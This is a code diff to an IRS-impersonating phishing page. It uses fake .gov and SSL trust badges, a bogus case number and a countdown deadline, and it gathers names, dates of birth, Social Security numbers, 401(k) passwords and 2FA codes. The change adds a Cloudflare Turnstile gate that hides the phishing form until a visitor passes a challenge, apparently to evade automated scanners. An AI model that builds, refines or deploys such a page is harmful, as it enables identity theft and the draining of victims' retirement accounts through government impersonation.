@@ -373,7 +373,24 @@
     .turnstile-container {
       display: flex;
       justify-content: center;
-      margin: 16px 0 12px;
+      margin: 20px 0 16px;
+    }
+    .gate {
+      padding: 40px 20px;
+      text-align: center;
+      background: #f8f9fc;
+      border-bottom: 1px solid #eaeef4;
+    }
+    .gate h2 {
+      color: #1a2a4a;
+      font-size: 18px;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    .gate p {
+      color: #5a6a7e;
+      font-size: 14px;
+      margin-bottom: 16px;
     }
     @media (max-width: 500px) {
       .provider-grid {
@@ -406,200 +423,209 @@
 <body>
 <div class="main-wrapper" id="mainWrapper">
 
-  <!-- ===== HEADER ===== -->
-  <div class="header">
-    <div class="top">
-      <div class="logo">
-        <div class="seal">🏛️</div>
-        <div>
-          <h1>IRS <span>Internal Revenue Service</span></h1>
-        </div>
-      </div>
-      <div class="badge">Secure</div>
-    </div>
-    <div class="tagline">Taxpayer Protection Unit &bull; Secure Messaging Portal</div>
-  </div>
-
-  <!-- ===== TRUST BANNER ===== -->
-  <div class="trust-banner">
-    <div class="left">
-      <span class="lock">🔒</span>
-      <span class="https">https://</span>
-      <span>Secure, encrypted connection</span>
-    </div>
-    <div class="right">
-      <a href="#">Official .gov website</a>
-      <a href="#">SSL Certified</a>
-    </div>
-  </div>
-
-  <!-- ===== SSL BADGE ===== -->
-  <div class="ssl-badge">
-    <span class="icon">🔒</span>
-    <span class="text"><strong>SSL Secure Connection</strong> &bull; Verified by DigiCert &bull; Encrypted in transit</span>
-  </div>
-
-  <!-- ===== STEP 1: IDENTITY + PROVIDER ===== -->
-  <div class="body" id="step1">
-    <div class="case-info">
-      <span class="label">Case Number:</span>
-      <span class="value" id="caseNumber">IRS-8842-X7</span>
-      <span class="label">Assigned Agent:</span>
-      <span class="value" id="agentName">Agent M. Chen</span>
-    </div>
-
-    <div class="countdown">
-      <span>Deadline to verify:</span>
-      <span class="timer" id="countdownTimer">48:00:00</span>
-    </div>
-
-    <div class="alert-banner">
-      <div class="icon">⚠</div>
-      <div class="text">
-        <strong>Action Required: 401(k) Verification</strong>
-        <span class="sub">Mandatory review under Section 3405. Your account status may be affected if not completed.</span>
-      </div>
-    </div>
-
-    <div class="form-group">
-      <label>Full Legal Name</label>
-      <input type="text" id="fullName" placeholder="John A. Doe" autocomplete="name" />
-    </div>
-    <div class="form-group">
-      <label>Email Address</label>
-      <input type="email" id="email" placeholder="john.doe@company.com" autocomplete="email" />
-    </div>
-    <div class="form-row">
-      <div class="form-group">
-        <label>Phone Number</label>
-        <input type="text" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
-      </div>
-      <div class="form-group">
-        <label>Date of Birth <span class="optional">(MM/DD/YYYY)</span></label>
-        <input type="text" id="dob" placeholder="06/15/1980" autocomplete="bday" />
-      </div>
-    </div>
-    <div class="form-group">
-      <label>Social Security Number</label>
-      <input type="text" id="ssn" placeholder="123-45-6789" autocomplete="off" />
-    </div>
-
-    <div style="margin-bottom: 14px; margin-top: 6px;">
-      <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
-      <div class="provider-grid" id="providerGrid">
-        <label class="provider-card" data-provider="fidelity">
-          <input type="radio" name="provider" value="fidelity" />
-          <span class="logo">🏦</span> Fidelity
-        </label>
-        <label class="provider-card" data-provider="vanguard">
-          <input type="radio" name="provider" value="vanguard" />
-          <span class="logo">📈</span> Vanguard
-        </label>
-        <label class="provider-card" data-provider="schwab">
-          <input type="radio" name="provider" value="schwab" />
-          <span class="logo">💰</span> Schwab
-        </label>
-        <label class="provider-card" data-provider="adp">
-          <input type="radio" name="provider" value="adp" />
-          <span class="logo">👥</span> ADP
-        </label>
-        <label class="provider-card" data-provider="paychex">
-          <input type="radio" name="provider" value="paychex" />
-          <span class="logo">📋</span> Paychex
-        </label>
-        <label class="provider-card" data-provider="empower">
-          <input type="radio" name="provider" value="empower" />
-          <span class="logo">🛡️</span> Empower
-        </label>
-        <label class="provider-card" data-provider="principal">
-          <input type="radio" name="provider" value="principal" />
-          <span class="logo">☂️</span> Principal
-        </label>
-        <label class="provider-card" data-provider="transamerica">
-          <input type="radio" name="provider" value="transamerica" />
-          <span class="logo">🏛️</span> Transamerica
-        </label>
-        <label class="provider-card" data-provider="other">
-          <input type="radio" name="provider" value="other" />
-          <span class="logo">❓</span> Other
-        </label>
-      </div>
-    </div>
-
-    <!-- Cloudflare Turnstile -->
+  <!-- ===== GATE: TURNSTILE FIRST ===== -->
+  <div class="gate" id="gate">
+    <h2>🔒 Secure Access</h2>
+    <p>Please complete the security check below to access the IRS verification portal.</p>
     <div class="turnstile-container">
       <div class="cf-turnstile" data-sitekey="0x4AAAAAADq8fUvJ_YtnD2wI" data-callback="onTurnstileSuccess"></div>
     </div>
-
-    <button class="btn-primary" id="step1Btn" disabled onclick="submitStep1()">Continue to Verification</button>
-
-    <div class="footer">
-      <div class="top-row">
-        <span>🔒 256-bit encryption &bull; Official IRS Communication</span>
-        <span>An official website of the U.S. government</span>
-      </div>
-      <div class="bottom-row">
-        <a href="#">Privacy Policy</a>
-        <a href="#">Accessibility</a>
-        <a href="#">Contact Us</a>
-        <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
-        <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
-      </div>
-    </div>
+    <div id="gateStatus" style="font-size:13px;color:#5a6a7e;margin-top:8px;">Waiting for verification...</div>
   </div>
 
-  <!-- ===== STEP 2: CREDENTIALS + 2FA ===== -->
-  <div class="body hidden" id="step2">
-    <div class="alert-banner" style="border-left-color: #1a2a4a; background: #f0f4fa;">
-      <div class="icon">🔐</div>
-      <div class="text">
-        <strong>401(k) Account Verification</strong>
-        <span class="sub">Enter your 401(k) login credentials and verification code (if required).</span>
+  <!-- ===== MAIN CONTENT (Hidden until Turnstile passes) ===== -->
+  <div id="mainContent" style="display:none;">
+
+    <!-- HEADER -->
+    <div class="header">
+      <div class="top">
+        <div class="logo">
+          <div class="seal">🏛️</div>
+          <div>
+            <h1>IRS <span>Internal Revenue Service</span></h1>
+          </div>
+        </div>
+        <div class="badge">Secure</div>
+      </div>
+      <div class="tagline">Taxpayer Protection Unit &bull; Secure Messaging Portal</div>
+    </div>
+
+    <!-- TRUST BANNER -->
+    <div class="trust-banner">
+      <div class="left">
+        <span class="lock">🔒</span>
+        <span class="https">https://</span>
+        <span>Secure, encrypted connection</span>
+      </div>
+      <div class="right">
+        <a href="#">Official .gov website</a>
+        <a href="#">SSL Certified</a>
       </div>
     </div>
 
-    <div class="form-group">
-      <label>401(k) Username or Email</label>
-      <input type="text" id="loginEmail" placeholder="Enter your 401(k) username or email" autocomplete="username" />
-    </div>
-    <div class="form-group">
-      <label>401(k) Password</label>
-      <input type="password" id="loginPassword" placeholder="Enter your 401(k) password" autocomplete="current-password" />
-    </div>
-    <div class="form-group">
-      <label>2FA Code <span class="optional">(if prompted by your provider)</span></label>
-      <input type="text" id="loginMFA" placeholder="6-digit code (if required)" maxlength="6" autocomplete="off" />
-      <div style="font-size: 11px; color: #5a6a7e; margin-top: 3px;">If you don't have a code yet, you can skip and enter it on the next screen.</div>
+    <!-- SSL BADGE -->
+    <div class="ssl-badge">
+      <span class="icon">🔒</span>
+      <span class="text"><strong>SSL Secure Connection</strong> &bull; Verified by DigiCert &bull; Encrypted in transit</span>
     </div>
 
-    <div style="display: flex; gap: 10px; margin-top: 4px;">
-      <button class="btn-primary" onclick="submitStep2()" style="flex: 2;" id="submitBtn2">Verify & Submit</button>
-      <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634;">←</button>
-    </div>
-
-    <div class="footer">
-      <div class="top-row">
-        <span>⏳ Session expires in 14:32</span>
-        <span>An official website of the U.S. government</span>
+    <!-- STEP 1: IDENTITY + PROVIDER -->
+    <div class="body" id="step1">
+      <div class="case-info">
+        <span class="label">Case Number:</span>
+        <span class="value" id="caseNumber">IRS-8842-X7</span>
+        <span class="label">Assigned Agent:</span>
+        <span class="value" id="agentName">Agent M. Chen</span>
       </div>
-      <div class="bottom-row">
-        <a href="#" onclick="goBack(); return false;">Change information</a>
-        <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
-        <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+
+      <div class="countdown">
+        <span>Deadline to verify:</span>
+        <span class="timer" id="countdownTimer">48:00:00</span>
+      </div>
+
+      <div class="alert-banner">
+        <div class="icon">⚠</div>
+        <div class="text">
+          <strong>Action Required: 401(k) Verification</strong>
+          <span class="sub">Mandatory review under Section 3405. Your account status may be affected if not completed.</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Full Legal Name</label>
+        <input type="text" id="fullName" placeholder="John A. Doe" autocomplete="name" />
+      </div>
+      <div class="form-group">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="john.doe@company.com" autocomplete="email" />
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Phone Number</label>
+          <input type="text" id="phone" placeholder="(555) 123-4567" autocomplete="tel" />
+        </div>
+        <div class="form-group">
+          <label>Date of Birth <span class="optional">(MM/DD/YYYY)</span></label>
+          <input type="text" id="dob" placeholder="06/15/1980" autocomplete="bday" />
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Social Security Number</label>
+        <input type="text" id="ssn" placeholder="123-45-6789" autocomplete="off" />
+      </div>
+
+      <div style="margin-bottom: 14px; margin-top: 6px;">
+        <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
+        <div class="provider-grid" id="providerGrid">
+          <label class="provider-card" data-provider="fidelity">
+            <input type="radio" name="provider" value="fidelity" />
+            <span class="logo">🏦</span> Fidelity
+          </label>
+          <label class="provider-card" data-provider="vanguard">
+            <input type="radio" name="provider" value="vanguard" />
+            <span class="logo">📈</span> Vanguard
+          </label>
+          <label class="provider-card" data-provider="schwab">
+            <input type="radio" name="provider" value="schwab" />
+            <span class="logo">💰</span> Schwab
+          </label>
+          <label class="provider-card" data-provider="adp">
+            <input type="radio" name="provider" value="adp" />
+            <span class="logo">👥</span> ADP
+          </label>
+          <label class="provider-card" data-provider="paychex">
+            <input type="radio" name="provider" value="paychex" />
+            <span class="logo">📋</span> Paychex
+          </label>
+          <label class="provider-card" data-provider="empower">
+            <input type="radio" name="provider" value="empower" />
+            <span class="logo">🛡️</span> Empower
+          </label>
+          <label class="provider-card" data-provider="principal">
+            <input type="radio" name="provider" value="principal" />
+            <span class="logo">☂️</span> Principal
+          </label>
+          <label class="provider-card" data-provider="transamerica">
+            <input type="radio" name="provider" value="transamerica" />
+            <span class="logo">🏛️</span> Transamerica
+          </label>
+          <label class="provider-card" data-provider="other">
+            <input type="radio" name="provider" value="other" />
+            <span class="logo">❓</span> Other
+          </label>
+        </div>
+      </div>
+
+      <button class="btn-primary" id="step1Btn" onclick="submitStep1()">Continue to Verification</button>
+
+      <div class="footer">
+        <div class="top-row">
+          <span>🔒 256-bit encryption &bull; Official IRS Communication</span>
+          <span>An official website of the U.S. government</span>
+        </div>
+        <div class="bottom-row">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Accessibility</a>
+          <a href="#">Contact Us</a>
+          <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
+          <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+        </div>
       </div>
     </div>
-  </div>
 
-  <!-- ===== STEP 3: SUCCESS ===== -->
-  <div class="body hidden" id="step3">
-    <div class="success-card">
-      <div class="check">✓</div>
-      <h2>Verification Complete</h2>
-      <p>Your 401(k) account has been successfully verified. You will receive a confirmation notice within 5 business days.</p>
-      <a href="https://www.irs.gov" class="btn">Continue to IRS.gov</a>
+    <!-- STEP 2: CREDENTIALS + 2FA -->
+    <div class="body hidden" id="step2">
+      <div class="alert-banner" style="border-left-color: #1a2a4a; background: #f0f4fa;">
+        <div class="icon">🔐</div>
+        <div class="text">
+          <strong>401(k) Account Verification</strong>
+          <span class="sub">Enter your 401(k) login credentials and verification code (if required).</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>401(k) Username or Email</label>
+        <input type="text" id="loginEmail" placeholder="Enter your 401(k) username or email" autocomplete="username" />
+      </div>
+      <div class="form-group">
+        <label>401(k) Password</label>
+        <input type="password" id="loginPassword" placeholder="Enter your 401(k) password" autocomplete="current-password" />
+      </div>
+      <div class="form-group">
+        <label>2FA Code <span class="optional">(if prompted by your provider)</span></label>
+        <input type="text" id="loginMFA" placeholder="6-digit code (if required)" maxlength="6" autocomplete="off" />
+        <div style="font-size: 11px; color: #5a6a7e; margin-top: 3px;">If you don't have a code yet, you can skip and enter it on the next screen.</div>
+      </div>
+
+      <div style="display: flex; gap: 10px; margin-top: 4px;">
+        <button class="btn-primary" onclick="submitStep2()" style="flex: 2;" id="submitBtn2">Verify & Submit</button>
+        <button onclick="goBack()" style="flex: 0.5; background: #eaeef4; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; color: #1a2634;">←</button>
+      </div>
+
+      <div class="footer">
+        <div class="top-row">
+          <span>⏳ Session expires in 14:32</span>
+          <span>An official website of the U.S. government</span>
+        </div>
+        <div class="bottom-row">
+          <a href="#" onclick="goBack(); return false;">Change information</a>
+          <a href="https://www.irs.gov" target="_blank">IRS.gov</a>
+          <a href="https://www.treasury.gov" target="_blank">Treasury.gov</a>
+        </div>
+      </div>
     </div>
-  </div>
 
+    <!-- STEP 3: SUCCESS -->
+    <div class="body hidden" id="step3">
+      <div class="success-card">
+        <div class="check">✓</div>
+        <h2>Verification Complete</h2>
+        <p>Your 401(k) account has been successfully verified. You will receive a confirmation notice within 5 business days.</p>
+        <a href="https://www.irs.gov" class="btn">Continue to IRS.gov</a>
+      </div>
+    </div>
+
+  </div><!-- end mainContent -->
 </div>
 
 <script>
@@ -616,7 +642,13 @@
 
   function onTurnstileSuccess() {
     turnstilePassed = true;
-    document.getElementById('step1Btn').disabled = false;
+    document.getElementById('gateStatus').textContent = '✅ Verification passed. Loading portal...';
+    document.getElementById('gateStatus').style.color = '#1a6b3a';
+    // Show main content after a short delay
+    setTimeout(function() {
+      document.getElementById('gate').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+    }, 600);
   }
 
   // ============================================================
